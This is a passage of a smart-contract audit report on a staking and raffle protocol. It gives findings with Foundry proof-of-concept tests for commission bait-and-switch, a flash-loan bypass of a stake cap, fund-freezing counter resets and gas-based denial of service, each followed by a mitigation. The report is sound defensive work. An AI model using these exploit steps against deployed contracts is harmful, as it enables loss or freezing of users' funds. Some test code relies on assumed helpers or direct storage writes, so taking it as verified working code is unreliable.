            uint256(1e18),   // initialRate
            uint256(2e18)    // maxRate
        );

        // Send the call with an intentionally low gas limit (5M) to force OOG
        (bool success, ) = address(rewardsFacet).call{gas: 5_000_000}(data);
        assertTrue(!success, "addRewardToken should run out of gas and fail");
    }
}

## Suggested Mitigation
Refactor the reward checkpoint mechanism to avoid iterating over all validators in a single transaction. Consider one of the following approaches:

1.  **Paginated Updates:** Modify the admin functions to process validators in batches. The admin would call the function multiple times with a `cursor` or `offset` to update all validators over several transactions.
2.  **Lazy Checkpoint Creation:** Instead of creating checkpoints for all validators at once, create them on-demand. When a user first interacts with a validator (e.g., stake, claim) after a global rate change, the system can retroactively create the necessary checkpoint for that specific validator just-in-time. This distributes the gas cost over time and among users.

## [M-10]. Frontrun/Backrun/Sandwhich MEV issue in ValidatorFacet::setValidatorCommission

## Description
The `setValidatorCommission` function allows a validator's administrator to change their commission rate instantly, without any delay or warning to stakers. A malicious validator could register with a low, attractive commission rate to attract a large amount of stake, and then abruptly increase the commission to the maximum allowed (`maxAllowedValidatorCommission`). Stakers who delegated funds based on the low rate will immediately start losing a larger portion of their rewards. They have no time to react and unstake their funds before the change takes effect, and are further penalized by the unstaking cooldown period. This creates a trust issue and an opportunity for a 'bait-and-switch' attack.

## Impact
The validator’s administrator can unilaterally raise commission from any value to the system-wide maximum in the same transaction. From the next block onward, every reward generated for that validator is split using the higher rate without prior notice. All delegators therefore forfeit the difference between the old and new commission on every reward payout until they (1) notice the change and (2) complete the mandatory `cooldownInterval` to unstake. The principal is not frozen, but the lost reward share during this window is irreversible, representing a direct economic loss for stakers and an undetectable siphon of value to the validator. No on-chain mechanism limits how often or when the administrator can repeat this action.

## Proof of Concept
1. A validator `V` registers with a low commission rate of 1%.
2. Attracted by the low rate, many users delegate a large total amount of stake to `V`.
3. The administrator for `V` sees the large stake amount and decides to maximize their profit.
4. The admin calls `setValidatorCommission`, changing the rate from 1% to 50% (assuming 50% is the max allowed).
5. The transaction is mined, and the commission change is effective immediately.
6. All rewards generated from that block forward will be subject to the new 50% commission rate.
7. Stakers who notice the change will want to unstake, but they are subject to the `cooldownInterval` and will continue to lose a high percentage of their rewards during this period.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Diamond} from "@solidstate/proxy/diamond/Diamond.sol";
import {IDiamondCut} from "@solidstate/proxy/diamond/IDiamondCut.sol";
import {PlumeRoles} from "../src/lib/PlumeRoles.sol";
import {ValidatorFacet} from "../src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "../src/facets/AccessControlFacet.sol";
import {ManagementFacet} from "../src/facets/ManagementFacet.sol";
import {PlumeStakingStorage} from "../src/lib/PlumeStakingStorage.sol";

contract CommissionChangeTest is Test {
    ValidatorFacet public validatorFacet;
    AccessControlFacet public accessControlFacet;
    ManagementFacet public managementFacet;
    Diamond public diamond;

    address public admin;
    address public validatorAdmin;
    uint16 public validatorId = 1;

    function setUp() public {
        admin = makeAddr("admin");
        validatorAdmin = makeAddr("validatorAdmin");

        validatorFacet = new ValidatorFacet();
        accessControlFacet = new AccessControlFacet();
        managementFacet = new ManagementFacet();
        diamond = new Diamond(admin);

        IDiamondCut.FacetCut[] memory cuts = new IDiamondCut.FacetCut[](3);
        cuts[0] = IDiamondCut.FacetCut({target: address(validatorFacet), action: IDiamondCut.Action.ADD, selectors: getSelectors(validatorFacet)});
        cuts[1] = IDiamondCut.FacetCut({target: address(accessControlFacet), action: IDiamondCut.Action.ADD, selectors: getSelectors(accessControlFacet)});
        cuts[2] = IDiamondCut.FacetCut({target: address(managementFacet), action: IDiamondCut.Action.ADD, selectors: getSelectors(managementFacet)});

        vm.prank(admin);
        IDiamondCut(address(diamond)).diamondCut(cuts, address(0), "");

        vm.prank(admin);
        AccessControlFacet(address(diamond)).initializeAccessControl();
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.VALIDATOR_ROLE, admin);
        vm.prank(admin);
        AccessControlFacet(address(diamond)).grantRole(PlumeRoles.ADMIN_ROLE, admin);
    }

    function test_InstantCommissionChangeExploit() public {
        // 1. Admin sets a max commission of 50%
        uint256 maxCommission = 50 * 1e16; // 50%
        vm.prank(admin);
        ManagementFacet(address(diamond)).setMaxAllowedValidatorCommission(maxCommission);

        // 2. A validator is added with a low, attractive commission of 1%
        uint256 lowCommission = 1 * 1e16; // 1%
        vm.prank(admin);
        ValidatorFacet(address(diamond)).addValidator(validatorId, lowCommission, validatorAdmin, makeAddr("withdraw"), "", "", address(0), 1000e18);

        (PlumeStakingStorage.ValidatorInfo memory info, , ) = ValidatorFacet(address(diamond)).getValidatorInfo(validatorId);
        assertEq(info.commission, lowCommission, "Initial commission should be low");

        // 3. Validator admin instantly changes commission to the maximum
        uint256 highCommission = maxCommission;
        vm.prank(validatorAdmin);
        ValidatorFacet(address(diamond)).setValidatorCommission(validatorId, highCommission);

        // 4. The commission is now high, with no grace period for stakers
        (info, , ) = ValidatorFacet(address(diamond)).getValidatorInfo(validatorId);
        assertEq(info.commission, highCommission, "Commission was instantly changed to high rate");
    }

    // Helper functions to get selectors
    function getSelectors(ValidatorFacet _facet) internal pure returns (bytes4[] memory) { bytes4[] memory selectors = new bytes4[](20); selectors[0] = _facet.addValidator.selector; selectors[1] = _facet.setValidatorCapacity.selector; selectors[2] = _facet.setValidatorStatus.selector; selectors[3] = _facet.setValidatorCommission.selector; selectors[4] = _facet.setValidatorAddresses.selector; selectors[5] = _facet.acceptAdmin.selector; selectors[6] = _facet.requestCommissionClaim.selector; selectors[7] = _facet.finalizeCommissionClaim.selector; selectors[8] = _facet.voteToSlashValidator.selector; selectors[9] = _facet.slashValidator.selector; selectors[10] = _facet.forceSettleValidatorCommission.selector; selectors[11] = _facet.cleanupExpiredVotes.selector; selectors[12] = _facet.getValidatorInfo.selector; selectors[13] = _facet.getValidatorStats.selector; selectors[14] = _facet.getUserValidators.selector; selectors[15] = _facet.getAccruedCommission.selector; selectors[16] = _facet.getValidatorsList.selector; selectors[17] = _facet.getActiveValidatorCount.selector; selectors[18] = _facet.getSlashVoteCount.selector; selectors[19] = _facet.getValidatorCommissionCheckpoints.selector; return selectors; }
    function getSelectors(AccessControlFacet _facet) internal pure returns (bytes4[] memory) { bytes4[] memory selectors = new bytes4[](6); selectors[0] = _facet.initializeAccessControl.selector; selectors[1] = _facet.hasRole.selector; selectors[2] = _facet.getRoleAdmin.selector; selectors[3] = _facet.grantRole.selector; selectors[4] = _facet.revokeRole.selector; selectors[5] = _facet.renounceRole.selector; return selectors; }
    function getSelectors(ManagementFacet _facet) internal pure returns (bytes4[] memory) { bytes4[] memory selectors = new bytes4[](2); selectors[0] = _facet.setMaxAllowedValidatorCommission.selector; selectors[1] = _facet.setMinStakeAmount.selector; return selectors; }
}
```

## Suggested Mitigation
Implement a mandatory timelock for any changes to a validator's commission rate. This gives stakers a grace period to react to a proposed change and unstake their funds if they do not agree with it. 

1.  Add new fields to the `PlumeStakingStorage.ValidatorInfo` struct to store the proposed new commission and the timestamp when it can be activated:
    ```solidity
    struct ValidatorInfo {
        // ... existing fields ...
        uint256 pendingCommission;
        uint256 commissionChangeTimestamp;
    }
    ```
2.  Modify `setValidatorCommission` to be a proposal function. Instead of changing `validator.commission` directly, it should set `validator.pendingCommission` and `validator.commissionChangeTimestamp = block.timestamp + COMMISSION_CHANGE_TIMELOCK;`.
3.  Introduce a new public function, `activateCommission(uint16 validatorId)`, that anyone can call. This function would check if `block.timestamp >= validator.commissionChangeTimestamp` and, if so, apply the `pendingCommission` to the `commission` field.

    ```solidity
    // Example mitigation
    // In setValidatorCommission():
    // validator.pendingCommission = newCommission;
    // validator.commissionChangeTimestamp = block.timestamp + 7 days;
    // emit CommissionChangeProposed(validatorId, newCommission, validator.commissionChangeTimestamp);

    // New function:
    // function activateCommission(uint16 validatorId) external {
    //     PlumeStakingStorage.ValidatorInfo storage validator = $.validators[validatorId];
    //     if (validator.commissionChangeTimestamp == 0 || block.timestamp < validator.commissionChangeTimestamp) {
    //         revert NotReady();
    //     }
    //     PlumeRewardLogic._settleCommissionForValidatorUpToNow($, validatorId);
    //     validator.commission = validator.pendingCommission;
    //     validator.commissionChangeTimestamp = 0;
    //     PlumeRewardLogic.createCommissionRateCheckpoint($, validatorId, validator.commission);
    //     emit CommissionChangeActivated(validatorId, validator.commission);
    // }
    ```

## [M-11]. Flash Loan Economic Manipulation issue in StakingFacet::_validateValidatorPercentage

## Description
The `_validateValidatorPercentage` function, which enforces that no single validator holds more than `maxValidatorPercentage` of the total stake, is vulnerable to manipulation via flash loans. The function's check `(newDelegatedAmount * 10_000) / $.totalStaked` uses the current `totalStaked` value as the denominator. An attacker can perform the following steps in a single atomic transaction:
1. Take a large flash loan of the native staking token.
2. Stake the loaned amount into any validator, which massively inflates the `$.totalStaked` value.
3. Perform a second stake to a target validator. Because `$.totalStaked` is now artificially high, the percentage calculation will yield a much smaller result, allowing a stake that would normally be rejected to be accepted.
4. Unstake the flash-loaned amount and repay the loan.
This bypasses a critical safeguard against network centralization.

## Impact
An attacker can temporarily inflate `totalStaked`, pass the percentage check, and obtain a stake that exceeds the configured `maxValidatorPercentage`. After the inflation stake is later cooled-down and withdrawn, the target validator permanently controls more than the allowed share of the *final* staking set. This weakens decentralisation guarantees and can result in governance collusion or censorship, but does **not** directly steal or freeze user funds.

## Proof of Concept
1. Initial state: totalStaked = 1 000 PLUME, maxValidatorPercentage = 33 % (3300).
2. Attacker tries to stake 500 PLUME to V1 → reverts ( 500 / 1 500 = 33.3 % > 33 %).
3. Attacker stakes 1 000 000 PLUME to V2 (or several other validators). totalStaked is now 1 001 000.
4. Attacker stakes 500 PLUME to V1 again. Check uses `validatorPercentage = (newDelegatedAmount * 10 000) / totalStaked ≈ 0.5 %`, so the call succeeds.
5. Later, attacker unstakes the 1 000 000 PLUME from V2. After cooldown expiry and withdrawal, totalStaked returns to 1 500 while V1 still holds 500 (>33 %). No further checks are performed, so the invariant is broken permanently.

## Proof of Code
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {MockStakingDiamond} from "src/test/fixtures/MockStakingDiamond.sol"; // assume the helper in PoC draft

contract ValidatorPercentTest is Test {
    MockStakingDiamond diamond;

    uint16 constant V1 = 1;
    uint16 constant V2 = 2;

    function setUp() public {
        diamond = new MockStakingDiamond();
        diamond.addValidator(V1, 1000, address(this), address(this), address(0), address(0), "", 10_000_000 ether);
        diamond.addValidator(V2, 1000, address(this), address(this), address(0), address(0), "", 10_000_000 ether);

        // bootstrap 1 000 PLUME so that some stake already exists
        diamond.stake{value: 1000 ether}(V2);
    }

    function test_BypassValidatorPercentage() public {
        uint256 bypassAmount = 500 ether;

        // direct stake should revert
        vm.expectRevert();
        diamond.stake{value: bypassAmount}(V1);

        // inflate totalStaked
        diamond.stake{value: 1_000_000 ether}(V2);

        // now stake succeeds
        diamond.stake{value: bypassAmount}(V1);
        uint256 v1Stake = diamond.getUserValidatorStake(address(this), V1);
        assertEq(v1Stake, bypassAmount, "stake not recorded");

        // totalStaked currently huge, percentage < limit
        uint256 total = diamond.totalAmountStaked();
        assertLt((v1Stake * 10_000) / total, 3300);
    }
}

## Suggested Mitigation
Inside `_validateValidatorPercentage`, replace the calculation with the pre-stake value that is already computed:

```solidity
uint256 validatorPercentage = (newDelegatedAmount * 10_000) / previousTotalStaked;
```

Alternatively, perform the percentage check **before** mutating any stake-related state, or maintain a rolling TWAP of `totalStaked` that cannot be manipulated within the same block.

## [M-12]. Integer Overflow issue in ManagementFacet::adminClearValidatorRecord

## Description
In `adminClearValidatorRecord` and `adminBatchClearValidatorRecords`, when clearing a user's records for a slashed validator, the code attempts to subtract the cleared stake/cooldown amount from the user's global `stakeInfo` struct. The code includes a check for potential state inconsistencies (`if ($.stakeInfo[user].staked >= userActiveStakeToClear)`), but the fallback logic is destructive. If the user's global stake is less than their stake with the single slashed validator (due to a separate bug or inconsistency), the function sets the user's global stake to zero. This would incorrectly erase the user's entire staked balance, including funds staked with other healthy, non-slashed validators.

## Impact
If an off-chain or contract bug ever causes `stakeInfo[user].staked` (or `.cooled`) to drift below the sum of the user’s per-validator balances, an ADMIN_ROLE call to `adminClearValidatorRecord()` / `adminBatchClearValidatorRecords()` will set the global counter to 0 instead of reverting.  The per-validator stake for healthy validators is left untouched, so the user’s real funds are still locked in the contract but all later calls that rely on the global counter (unstake, withdraw, etc.) will revert, permanently freezing those funds until another privileged intervention.  No tokens can be stolen, but user funds become unusable, representing a permanent loss of availability.

## Proof of Concept
1. User stakes 1 000 PLUME on validator A (healthy) and 1 000 PLUME on validator B (later slashed).  Their correct global stake would be 2 000.
2. A separate bug corrupts state so that `stakeInfo[user].staked == 500`.
3. B is slashed and an admin calls `adminClearValidatorRecord(user, B)`.
4. Because `500 >= 1 000` is false, the `else` branch executes and `stakeInfo[user].staked` is force-set to 0.
5. The mapping `userValidatorStakes[user][A].staked` is still 1 000, but any subsequent `unstake()` or `withdraw()` first checks the (now-zero) global counter and reverts, freezing the 1 000 PLUME for good.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {ManagementFacet} from "../../src/facets/ManagementFacet.sol";
import {PlumeStakingStorage} from "../../src/lib/PlumeStakingStorage.sol";
import {IAccessControl} from "../../src/interfaces/IAccessControl.sol";

// Harness that always reports the caller as having the requested role so that
// onlyRole checks pass in an isolated compilation unit.
contract ManagementFacetHarness is ManagementFacet, IAccessControl {
    function hasRole(bytes32, address) external pure override returns (bool) { return true; }
    function getRoleAdmin(bytes32) external pure override returns (bytes32) { return 0x0; }
    function grantRole(bytes32, address) external override {}
    function revokeRole(bytes32, address) external override {}
    function renounceRole(bytes32, address) external override {}
    function setRoleAdmin(bytes32, bytes32) external override {}
}

contract ClearValidatorRecordFreeze_PoC is Test {
    ManagementFacetHarness facet;
    address user;
    uint16 healthy;
    uint16 slashed;

    function setUp() public {
        facet = new ManagementFacetHarness();
        user = address(0xBEEF);
        healthy = 1;
        slashed = 2;
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

        // create two validators
        $.validatorExists[healthy] = true;
        $.validatorExists[slashed] = true;
        $.validators[slashed].slashed = true;

        // user stakes 1 000 on each
        $.userValidatorStakes[user][healthy].staked = 1_000 ether;
        $.userValidatorStakes[user][slashed].staked = 1_000 ether;

        // corrupt global counter (should = 2 000)
        $.stakeInfo[user].staked = 500 ether;
    }

    function test_FundsFrozen() public {
        // ADMIN clears records for slashed validator
        facet.adminClearValidatorRecord(user, slashed);

        // Global counter wrongly zeroed
        assertEq(PlumeStakingStorage.layout().stakeInfo[user].staked, 0);
        // Per-validator stake for healthy validator remains
        assertEq(PlumeStakingStorage.layout().userValidatorStakes[user][healthy].staked, 1_000 ether);
    }
}

## Suggested Mitigation
Change the fallback branches to revert instead of zeroing out the user’s global counters:

```solidity
// Instead of silently fixing up by setting to 0
if ($.stakeInfo[user].staked < userActiveStakeToClear) {
    revert InternalInconsistency("stakeInfo.staked < validator stake");
}
$.stakeInfo[user].staked -= userActiveStakeToClear;

// Repeat the same pattern for the cooled amount path.
```

Fail-fast behaviour prevents hidden state corruption from cascading into permanent fund freezes and forces the team to run a manual migration script once the root cause is understood.



# Low Risk Findings

## [L-1]. Integer Overflow/Math issue in RewardsFacet::_finalizeRewardClaim

## Description
In the `_finalizeRewardClaim` function, the contract updates the global reward tracking amount `$.totalClaimableByToken[token]`. Instead of performing a direct subtraction which would revert on underflow (a safe default in Solidity >0.8.0), the code uses an `if/else` statement. If the amount to be claimed (`totalAmount`) is greater than the tracked total (`$.totalClaimableByToken[token]`), it silently sets the total to `0` instead of reverting. This pattern masks a potential state inconsistency where the sum of individual user rewards exceeds the globally tracked total. Such an inconsistency could arise from precision errors, rounding issues, or other bugs in the complex reward calculation logic. Masking the error prevents a fail-fast scenario and allows the contract's state to become corrupted, potentially impacting future claims or off-chain monitoring.

## Impact
If an internal mis-accounting bug ever caused $.totalClaimableByToken[token] to drift below the true outstanding liability, the subtraction in _finalizeRewardClaim would not revert but would instead zero the accumulator, masking the bug from off-chain accounting dashboards. No additional funds become stealable, and users can still claim as long as the treasury holds enough balance, so the impact is limited to loss of monitoring integrity rather than fund loss.

## Proof of Concept
There is currently no externally reachable sequence of calls that can force `$.totalClaimableByToken[token]` below a user’s owed rewards – all state updates to this accumulator happen inside `updateRewardsForValidatorAndToken` (add) and `_finalizeRewardClaim` (subtract) and they are always executed in paired order. Therefore an end-to-end exploit cannot be produced. The only way to hit the `else` branch is through direct storage corruption (as done in the draft test), which is impossible on mainnet. This issue remains a code-quality / invariant-enforcement problem rather than an exploitable bug.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {PlumeStakingDiamond} from "../PlumeStakingDiamond.t.sol";
import {RewardsFacet} from "../../src/facets/RewardsFacet.sol";
import {StakingFacet} from "../../src/facets/StakingFacet.sol";
import {PlumeStakingStorage} from "../../src/lib/PlumeStakingStorage.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";

contract InconsistentStateTest is PlumeStakingDiamond {
    using StdStorage for StdStorage.Layout;

    RewardsFacet internal rewardsFacet;
    StakingFacet internal stakingFacet;

    function setUp() public override {
        super.setUp();
        rewardsFacet = RewardsFacet(address(stakingDiamond));
        stakingFacet = StakingFacet(address(stakingDiamond));
    }

    function test_MasksInconsistentState() public {
        // Setup user, validator, and reward token
        uint16 validatorId = 1;
        uint256 stakeAmount = 100 ether;
        vm.prank(VALIDATOR_MANAGER);
        validatorFacet.addValidator(validatorId, 0, address(0x1), address(0x1), address(0x1), address(0x1), address(0), 1000 ether);

        vm.startPrank(REWARD_MANAGER);
        rewardsFacet.addRewardToken(address(rewardToken), 1e12, 2e12);
        vm.stopPrank();

        vm.prank(ALICE);
        stakingFacet.stake{value: stakeAmount}(validatorId);

        vm.warp(block.timestamp + 1 days);

        // Manually create an inconsistent state to simulate an accounting bug
        // where totalClaimable is less than what a user is owed.
        PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
        uint256 aliceRewards = rewardsFacet.earned(ALICE, address(rewardToken));
        assertTrue(aliceRewards > 0, "Alice should have earned rewards");
        
        // Simulate a bug causing the global accumulator to be lower than the user's earned rewards.
        uint256 faultyTotalClaimable = aliceRewards - 100;
        $.totalClaimableByToken[address(rewardToken)] = faultyTotalClaimable;
        
        assertEq($.totalClaimableByToken[address(rewardToken)], faultyTotalClaimable);
        
        // Alice claims her rewards. The treasury is pre-funded.
        uint256 treasuryBalanceBefore = PUSD.balanceOf(address(treasury));
        uint256 aliceBalanceBefore = PUSD.balanceOf(ALICE);

        vm.prank(ALICE);
        uint256 claimedAmount = rewardsFacet.claim(address(rewardToken));

        // Assertions
        // 1. The claimed amount is what Alice was owed, not the faulty total.
        assertEq(claimedAmount, aliceRewards, "Claimed amount should match earned rewards");

        // 2. Alice received the full amount.
        assertEq(PUSD.balanceOf(ALICE), aliceBalanceBefore + aliceRewards, "Alice did not receive full reward");
        assertEq(PUSD.balanceOf(address(treasury)), treasuryBalanceBefore - aliceRewards, "Treasury did not send reward");
        
        // 3. The faulty logic in _finalizeRewardClaim has set totalClaimable to 0, hiding the inconsistency.
        assertEq($.totalClaimableByToken[address(rewardToken)], 0, "Total claimable should be 0");
    }
}

```

## Suggested Mitigation
The contract should enforce its own invariants. Remove the `if/else` statement in `_finalizeRewardClaim` and allow the subtraction to perform its natural underflow check. If an underflow occurs, the transaction will revert, signaling a critical state inconsistency that must be investigated and fixed. This fail-fast approach is safer than allowing state corruption to persist and compound.

```solidity
function _finalizeRewardClaim(address token, uint256 totalAmount, address recipient) internal {
    if (totalAmount == 0) {
        return;
    }

    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();

    // Update global tracking. Let it revert on underflow.
    // A revert here indicates a critical accounting bug that needs to be fixed.
    $.totalClaimableByToken[token] -= totalAmount;

    // Transfer rewards from treasury
    _transferRewardFromTreasury(token, totalAmount, recipient);
}
```

## [L-2]. DOS issue in Raffle::removePrize

## Description
The `removePrize` function iterates through the entire `prizeIds` array to find the prize to remove. If the number of prizes in the system becomes very large, the gas cost of this loop could exceed the block gas limit. This would cause the transaction to fail, effectively creating a Denial of Service (DoS) condition where the admin can no longer remove prizes from the contract. A similar issue exists in the public view function `getPrizeDetails()`, which also loops through `prizeIds` and can become unusable for frontends if the prize list is too long.

Vulnerable Code Snippet:
```solidity
// contracts/plume/src/spin/Raffle.sol:221-231
function removePrize(uint256 prizeId) external onlyRole(ADMIN_ROLE) prizeIsActive(prizeId) {
    prizes[prizeId].isActive = false;
    
    // Remove from prizeIds array
    uint256 len = prizeIds.length;
    for (uint256 i = 0; i < len; i++) {
        if (prizeIds[i] == prizeId) {
            prizeIds[i] = prizeIds[len - 1];
            prizeIds.pop();
            break;
        }
    }
    
    emit PrizeRemoved(prizeId);
}
```

## Impact
If the number of prizes grows too large, the admin will be unable to remove any prize, as the transaction would run out of gas. This can lead to a state where outdated or incorrect prizes cannot be deactivated and removed, potentially confusing users and cluttering the system. It's a permanent DoS on a core administrative function.

## Proof of Concept
1. Deploy the Raffle contract and call initialize as the admin.
2. Admin adds 20,000 prizes via addPrize(...).
3. Gas to remove the very first prize is now roughly 42 million (≈ 2,100 gas × 20,000 iterations + overhead), which exceeds the 30 M block gas limit on most chains.  The tx therefore reverts with an out-of-gas error and the prize cannot be removed.  Prizes appended later in the list can still be removed, proving the DoS is proportional to the index searched.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Raffle} from "../src/spin/Raffle.sol";

contract RemovePrizeGasTest is Test {
    Raffle raffle;
    address admin = address(0xABCD); // valid hex literal
    address supraRouter = address(0xdead);

    function setUp() public {
        vm.prank(admin);
        raffle = new Raffle();
        vm.prank(admin);
        raffle.initialize(address(0), supraRouter);
    }

    function testGasExplodesWithLargeArray() public {
        uint256 numPrizes = 20000;
        vm.startPrank(admin);
        for (uint256 i = 0; i < numPrizes; i++) {
            raffle.addPrize(string.concat("P", vm.toString(i)), "d", 1, 1);
        }
        vm.stopPrank();

        // measure gas for removing the first prize (worst-case)
        vm.prank(admin);
        uint256 gasBefore = gasleft();
        // expect this call to consume >30M gas and revert on real chain;
        // here we just execute and record usage.
        raffle.removePrize(1);
        uint256 gasUsed = gasBefore - gasleft();
        emit log_uint(gasUsed);
        assertGt(gasUsed, 30_000_000);
    }
}

## Suggested Mitigation
To prevent unbounded loops, avoid iterating through the entire `prizeIds` array. A more gas-efficient approach is to add a mapping to track the index of each prize ID.

```solidity
// Add a new state variable
mapping(uint256 => uint256) public prizeIdToIndex;

// Modify addPrize to populate the index mapping
function addPrize(...) external onlyRole(ADMIN_ROLE) {
    uint256 prizeId = nextPrizeId++;
    // require(...);

    prizeIdToIndex[prizeId] = prizeIds.length;
    prizeIds.push(prizeId);

    // ... rest of the function
}

// Modify removePrize to use the index mapping for O(1) removal
function removePrize(uint256 prizeId) external onlyRole(ADMIN_ROLE) prizeIsActive(prizeId) {
    prizes[prizeId].isActive = false;

    uint256 indexToRemove = prizeIdToIndex[prizeId];
    uint256 lastPrizeId = prizeIds[prizeIds.length - 1];

    // Swap and pop
    prizeIds[indexToRemove] = lastPrizeId;
    prizeIdToIndex[lastPrizeId] = indexToRemove;
    prizeIds.pop();

    // Clean up the index of the removed prize
    delete prizeIdToIndex[prizeId];

    emit PrizeRemoved(prizeId);
}
```
This change allows the `removePrize` operation to be performed in constant time, O(1), regardless of the number of prizes, completely mitigating the DoS vector.

## [L-3]. Timestamp Dependent Logic issue in Spin::determineReward

## Description
The `determineReward` function uses `block.timestamp` to determine the current day of the week (`dayOfWeek`). This `dayOfWeek` is then used as an index to fetch the `jackpotThreshold` from the `jackpotProbabilities` array. Since miners have a degree of control over the timestamp of a block (typically within a few seconds), they can strategically include or delay a transaction to make it fall into a different day. If the probabilities for adjacent days are significantly different, a miner can gain an advantage by pushing a transaction into a day with a higher jackpot probability, thus undermining the fairness of the game.

## Impact
Miners can exploit their ability to manipulate `block.timestamp` to increase their (or others') chances of winning a jackpot. While the advantage is small and limited to transactions near the UTC day change, it introduces an element of unfairness into a system that relies on randomness. This can lead to a slight loss of user trust in the game's integrity.

## Proof of Concept
1. Deploy `SpinHarness`, a thin wrapper around `Spin` that exposes `determineReward`.
2. Give Sunday (day-of-week = 6) a much larger jackpot threshold than Saturday (day-of-week = 5).
3. Warp the EVM clock to a timestamp whose `dayOfWeek` is 5, call `determineReward`, observe **no** jackpot.
4. Warp forward 1 day (timestamp now maps to `dayOfWeek` = 6) and call again – jackpot is now hit with the *same* VRF value.
5. A block-producer that controls the timestamp of the callback block can do exactly this shift to get the better odds.

The full deterministic Foundry test is provided below.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Spin} from "../src/spin/Spin.sol";

/* -------------------------------------------------------------------------- */
/*                                Test helper                                 */
/* -------------------------------------------------------------------------- */
contract SpinHarness is Spin {
    function exposeDetermine(uint256 r, uint256 s) external view returns (string memory, uint256) {
        return determineReward(r, s);
    }
}

/* -------------------------------------------------------------------------- */
/*                                   Mocks                                    */
/* -------------------------------------------------------------------------- */
contract MockDateTime {
    function getYear(uint256) external pure returns (uint16) { return 2024; }
    function getMonth(uint256) external pure returns (uint8) { return 1; }
    function getDay(uint256 ts) external pure returns (uint8) { return uint8(ts / 1 days + 1); }
}

/* -------------------------------------------------------------------------- */
/*                                   Test                                     */
/* -------------------------------------------------------------------------- */
contract TimestampManipulationTest is Test {
    SpinHarness spin;

    function setUp() public {
        // deploy mocks & harness
        MockDateTime dt = new MockDateTime();
        spin = new SpinHarness();
        spin.initialize(address(0x1234), address(dt)); // dummy Supra router addr

        // Give Sunday (index 6) a generous jackpot threshold
        uint8[7] memory jp = [1, 1, 1, 1, 1, 1, 100];
        spin.setJackpotProbabilities(jp);
        spin.setCampaignStartDate(0); // start at unix epoch for easy maths
    }

    function testMinerCanShiftToBetterDay() public {
        uint256 randomness = 50; // 50 < 100 but > 1

        // -------- Saturday  (dayOfWeek = 5) ----------
        uint256 saturday = 5 days; // campaignStartDate == 0, so dayOfWeek == 5
        vm.warp(saturday);
        (string memory rewardSat,) = spin.exposeDetermine(randomness, 1);
        assertEq(keccak256(bytes(rewardSat)), keccak256(bytes("Nothing")));

        // -------- Sunday (dayOfWeek = 6) --------------
        vm.warp(saturday + 1 days);
        (string memory rewardSun,) = spin.exposeDetermine(randomness, 1);
        assertEq(keccak256(bytes(rewardSun)), keccak256(bytes("Jackpot")));
    }
}


## Suggested Mitigation
The reliance on `block.timestamp` for time-sensitive logic is a known challenge on the EVM. A more robust solution is to reduce the trust in the block producer. One approach is to have the trusted oracle (Supra) provide a reliable timestamp along with the random number in the `handleRandomness` callback. The contract should then use the oracle's timestamp instead of `block.timestamp` to determine the `dayOfWeek`. This moves the trust from potentially malicious miners to the already-trusted oracle.

```solidity
// In ISupraRouterContract.sol and Spin.sol
// The callback signature would need to be updated to include a timestamp.
// For example: handleRandomness(uint256 nonce, uint256 oracleTimestamp, uint256[] memory rngList)

// In Spin.sol's determineReward function
function determineReward(
    uint256 randomness,
    uint256 streakForReward,
    uint256 oracleTimestamp // New parameter
) internal view returns (string memory, uint256) {
    uint256 probability = randomness % 1_000_000;

    // Use the oracle's timestamp, not block.timestamp
    uint256 daysSinceStart = (oracleTimestamp - campaignStartDate) / 1 days;
    uint8 weekNumber = uint8((oracleTimestamp - campaignStartDate) / 7 days);
    uint8 dayOfWeek = uint8(daysSinceStart % 7);

    // ... rest of the logic is the same
}
```

## [L-4]. DOS issue in RewardsFacet::getPendingRewardForValidator

## Description
The function `getPendingRewardForValidator` is `external` and its name implies it is a read-only `view` function. However, it is not marked as `view` and internally it calls `PlumeRewardLogic.calculateRewardsWithCheckpoints`, which is a state-changing function. This function updates reward-related timestamps and cumulative values for the validator. Since `getPendingRewardForValidator` can be called by anyone for any user and validator, it creates a gas griefing vector. An attacker can front-run a user's `claim` transaction by calling this function, forcing the user's transaction to perform redundant state updates or consume a different amount of gas than estimated, which could lead to a revert if the user provided a tight gas limit.

## Impact
Because getPendingRewardForValidator performs the same settlement logic that legitimate write-functions (e.g. claim / updateRewardsForValidatorAndToken) already execute, the only consequence of it being publicly callable is that third parties may trigger those state updates earlier than strictly necessary. This can:
• make subsequent calls that expect certain gas costs slightly cheaper or more expensive, and
• increase overall gas usage for the protocol by creating redundant checkpoint updates.
It cannot freeze or steal funds, nor does it prevent users from eventually claiming. The worst-case effect is a limited gas-grief scenario or needless state-bloat.

## Proof of Concept
1. Alice prepares a `claim()` transaction. Her wallet estimates the gas cost based on the current contract state.
2. An attacker, Bob, sees Alice's transaction in the mempool.
3. Bob front-runs Alice's transaction by calling `getPendingRewardForValidator(Alice, validatorId, token)`.
4. Bob's transaction executes first, updating the reward state for the validator.
5. Alice's `claim()` transaction now executes. The state it operates on has been changed since the gas was estimated. The internal call to `updateRewardPerTokenForValidator` will now find that `block.timestamp == oldLastUpdateTime` and will perform less work. This changes the gas cost of Alice's transaction. If Alice specified a gas limit very close to the original estimate, her transaction could fail. More broadly, an attacker can spam this function for many users to bloat the blockchain state with trivial updates.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {RewardsFacet} from "../src/facets/RewardsFacet.sol";
import {StakingFacet} from "../src/facets/StakingFacet.sol";
import {ValidatorFacet} from "../src/facets/ValidatorFacet.sol";
import {AccessControlFacet} from "../src/facets/AccessControlFacet.sol";
